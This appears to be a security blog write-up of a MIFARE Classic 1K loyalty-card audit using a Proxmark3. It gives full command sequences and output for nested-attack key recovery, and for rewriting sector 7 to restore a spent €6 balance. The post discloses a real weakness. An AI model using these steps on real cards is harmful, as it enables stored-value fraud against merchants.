---
layout: single
title:  "Auditing a MIFARE Classic 1k"
date:   2023-01-03 16:55:50 -0500
categories: red-team
tags: proxmark3
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7) 
---

## A MIFARE Classic 1K Audit

Some services today offer loyalty cards in which the seller expects the customer to have reserved money and spend it only on their service. It is surprising how many big companies use these types of insecure cards.

> In this post, card identifiers and private keys have been anonymized.

To carry out an audit of these types of cards it is advisable to use an **NFC** reader, in this case the **proxmark3** will be used in the audit. To start working it is necessary to install the following software.

```bash
sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config \
libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev libbz2-dev libbluetooth-dev libpython3-dev libssl-dev
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3
make clean && make -j

client/proxmark3 /dev/ttyACM0
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2023-01-03-Mifare-Classic-1k/photo_5879631145723869965_y.jpg" height="500" width="825" /></p>

Some of these cards are  `MIFARE Classic 1K`. This is the case of the card to be audited:
- ATQA: `00 04`
- SAK: `08`
- ATS: `null`

> The _ATQA_, _SAK_ and _ATS_ values can be used to identify the manufacturer, tag type and application.

In order to get that information with the **proxmark3**.
```bash
[usb] pm3 --> hf search
 🕕  Searching for ISO14443-A tag...
[+]  UID: XX XX XX XX
[+] ATQA: 00 04
[+]  SAK: 08 [2]
[+] Possible types:
[+]    MIFARE Classic 1K
[=] proprietary non iso14443-4 card found, RATS not supported
[+] Prng detection: weak
[#] Auth error
[?] Hint: try `hf mf` commands

[+] Valid ISO 14443-A tag found
```

> [Datasheet AN10833](https://www.nxp.com/docs/en/application-note/AN10833.pdf)

## Card Structure

**MIFARE Classic** cards are only **EEPROM** memories containing between **1024** and **4096** bytes of data.

> **EEPROM** stands for electrically erasable programmable read-only memory and is a type of non-volatile memory used in computers.

The memory for **1k cards** is organized into **16 sectors** of **4 blocks** *(one block consists of 16 bytes)*, and only the first three blocks can be freely programmed as the last block of each sector *(trailer)* contains **two secret keys** `Key A` and `Key B` and programmable **access conditions** for each block in that sector.

The first data block *(block 0)* of the first sector *(sector 0)*, also called **Manufacturer Block**, stores the **IC** manufacturer data and is write-protected on most cards.

The trailer must have the following structure:
- `Key A`: Never readable *(6 bytes)*.
- `AC` or `acr`: Defines Access Conditions for every data block and the sector trailer. The access conditions of that sector determine whether `Key A` or `Key B` must be used *(3 bytes)*.
- `U`: Undefined byte, can be used for storage.
- `Key B`: Might be readable depending on `AC` *(6 bytes)*.

### Sector 0
<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2023-01-03-Mifare-Classic-1k/Pasted image 20230102093349.png" height="500" width="825" /></p>

### Sector 1-15
<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2023-01-03-Mifare-Classic-1k/Pasted image 20230102093436.png" height="500" width="825" /></p>

## Authentication Protocol

When the tag enters the electromagnetic field of the reader and powers up, it immediately starts the anti-collision protocol by sending its `uid`. The authentication process is the following:

- The **reader** then sends an authentication request for a specific block.
- The **tag** picks a challenge nonce `nT` and sends it to the reader in the clear.
- The **reader** sends its own challenge nonce `nR` together with the answer `aR` to the challenge of the tag.
- The **tag** finishes authentication by replying `aT` to the challenge of the reader.

Starting with `nR`, all communication is encrypted. This means that `nR`, `aR`, and `aT` are **XOR-ed**  with the keystream `ks1`, `ks2`, `ks3`.

```bash
pm3 --> hf mf rdsc -s 002 -k FFFFFFFFFFFF -v
pm3 --> trace list
      Start |        End | Src | Data                              | Annotation
------------+------------+-----+-----------------------------------+--------------------
          0 |        992 | Rdr |52                                 | req type A
       2116 |       4484 | Tag |04  00                             | answer req
       7040 |       9504 | Rdr |93  20                             | select
      10548 |      16372 | Tag |XX  XX  XX  XX  XX                 | uid, bcc
     112384 |     122912 | Rdr |XX  XX  XX  XX  XX  XX  XX  XX  XX | select(uid)
     123956 |     127476 | Tag |08  b6  dd                         | MIFARE 1k
     129792 |     134560 | Rdr |60  08  db  f7                     | auth(block 0x07) key A
     136372 |     141044 | Tag |ef  b6  3e  38                     | nT
     150656 |     160032 | Rdr |de  31  60  62  9d  a6  b1  64     | nR XOR ks1, aR XOR ks2
     161076 |     165748 | Tag |3b  df  a3! 38!                    | aT XOR ks3
```

> [Dismantling.Mifare](https://www.cs.bham.ac.uk/~garciaf/publications/Dismantling.Mifare.pdf)
> [Datasheet MF1S50YYX_V1](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf)

## Retrieve keys

As seen in the previous image, the trailer of each sector contains a `key A` and a `key B`. To be able to read or write some blocks it is necessary to know the keys. In order to do that, there is an attack called **Nested Attack**. A lot of publicly used cards use at least one block encrypted with **default keys**. The **Nested Attack** consists of:

- Authenticate to the block with default key and read tag's Nt *(determined by LFSR)*.
- Authenticate to the same block with default key and read tag's Nt' *(determined by LFSR) (this authentication is in an encrypted session)*.
- Compute *timing distance* *(number of LFSR shifts)*.
- Guess the Nt value and authenticate to the different block.

> Linear Feedback Shift Register (LFSR). 

```bash
# Nested Attack
[usb] pm3 --> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
[+] Testing known keys. Sector count 16
[=] Chunk 0.6s | found 31/32 keys (46)
[+] Time to check 45 known keys: 1 seconds

[+] enter nested key recovery
[+] Found 2 key candidates

[+] Target block   28 key type A -- found valid key [ AXXYYXXYYXXB ]

[=] Chunk 0.5s | found 32/32 keys (1)
[+] time in nested 2 seconds

[=] trying to read key B...

[+] found keys:

[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  006 | 027 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  007 | 031 | AXXYYXXYYXXB | 1 | FFFFFFFFFFFF | 1
[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+] -----+-----+--------------+---+--------------+----
[+] ( 0:Failed / 1:Success )

# Bruteforce Key A with dic
[usb] pm3 --> hf mf chk --1k -a -f /root/proxmark3/somekeys.dic
[+] found keys:

[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  006 | 027 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  007 | 031 | AXXYYXXYYXXB | 1 | FFFFFFFFFFFF | 1
[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+] -----+-----+--------------+---+--------------+----
[+] ( 0:Failed / 1:Success )

# Check found key on block 0 with key A
[usb] pm3 --> hf mf chk -a --tblk 0 -k AXXYYXXYYXXB

# Read sector 007
[usb] pm3 --> hf mf rdsc -s 007 -k AXXYYXXYYXXB -v

[=]   # | sector 07 / 0x07                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]  29 | 33 45 56 63 69 55 4E 71 42 4D 64 37 38 51 33 39 | 3EVciUNqBMd78Q39
[=]  30 | 78 74 63 4A 4F 55 67 3D 3D 30 30 30 30 30 30 30 | xtcJOUg==0000000
[=]  31 | 00 00 00 00 00 00 FF 07 80 69 FF FF FF FF FF FF | .........i......

[=] ----------------------- Sector trailer decoder -----------------------
[=] key A........ 000000000000
[=] acr.......... FF0780
[=] user / gpb... 69
[=] key B........ FFFFFFFFFFFF

[=]   # | Access rights
[=] ----+-----------------------------------------------------------------
[=]  28 | read AB; write AB; increment AB; decrement transfer restore AB
[=]  29 | read AB; write AB; increment AB; decrement transfer restore AB
[=]  30 | read AB; write AB; increment AB; decrement transfer restore AB
[=]  31 | write A by A; read/write ACCESS by A; read/write B by A
[=] ----------------------------------------------------------------------
```

As you can see, the only sector that has **key A** is `0x07`, doing some operations with the card *(buying something, or adding balance)* it is observed that the data of that sector varies, therefore it is determined where the balance of the card is located. 

It is observed that the sector contains an `acr` of `FF0780`, which grant us permission to write only with `Key A`. It is also possible read the sector `0x07` with `Key B`.

```bash
pm3 --> hf mf rdsc -s 007 -b -k FFFFFFFFFFFF -v
```

## Write card

With the balance of the card empty, the following bytes are observed in sector `0x07`:

```bash
[usb] pm3 --> hf mf rdsc -s 007 -k AXXYYXXYYXXB -v
[=]   # | sector 07 / 0x07                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]  29 | 33 67 48 4D 46 44 75 71 54 38 50 61 72 46 5A 45 | 3gHMFDuqT8ParFZE
[=]  30 | 57 65 59 6E 6E 79 67 3D 3D 30 30 30 30 30 30 30 | WeYnnyg==0000000
[=]  31 | 00 00 00 00 00 00 FF 07 80 69 FF FF FF FF FF FF | .........i......


3gHMFDuqT8ParFZEWeYnnyg==0000000
```

At the moment **€6** is added the sector is modified:

```bash
[usb] pm3 --> hf mf rdsc -s 007 -k AXXYYXXYYXXB -v
[=]   # | sector 07 / 0x07                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]  29 | 33 45 56 63 69 55 4E 71 42 4D 64 37 38 51 33 39 | 3EVciUNqBMd78Q39
[=]  30 | 78 74 63 4A 4F 55 67 3D 3D 30 30 30 30 30 30 30 | xtcJOUg==0000000
[=]  31 | 00 00 00 00 00 00 FF 07 80 69 FF FF FF FF FF FF | .........i......

3EVciUNqBMd78Q39xtcJOUg==0000000
```

Therefore, even if we do not know how to decipher this information, knowing that these bytes are **€6** we can write another **€6** in that sector when the balance is spent with the `Key A`.

```bash
pm3 --> hf mf wrbl --blk 29 -k AXXYYXXYYXXB -d 3345566369554E71424D643738513339
[=] Writing block no 29, key A - AXXYYXXYYXXB
[=] data: 33 45 56 63 69 55 4E 71 42 4D 64 37 38 51 33 39
[+] Write ( ok )
[?] try `hf mf rdbl` to verify

pm3 --> hf mf wrbl --blk 30 -k AXXYYXXYYXXB -d 7874634A4F55673D3D30303030303030
[=] Writing block no 30, key A - AXXYYXXYYXXB
[=] data: 78 74 63 4A 4F 55 67 3D 3D 30 30 30 30 30 30 30
[+] Write ( ok )
[?] try `hf mf rdbl` to verify
```

## Decipher Data

It is known that the balance is `0.20 cents` in the `3gHMFDuqT8ParFZEWeYnnyg==0000000`, but searching for that string does not find any possible match, a priori it must be an encryption with a key.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2023-01-03-Mifare-Classic-1k/Pasted image 20230102131815.png" height="500" width="825" /></p>

#### Refs

- [proxmark3-hardnested](https://guillaumeplayground.net/proxmark3-hardnested/)
- [mifare_classic_cracking](https://arkandas.com/blog/mifare_classic_cracking/)
- [decrypting-mifare-1k](https://hackerwarehouse.tv/product-knowledgebase/proxmark/decrypting-and-emulating-mifare-1k-cards-using-the-rfid-tools-android-app/)
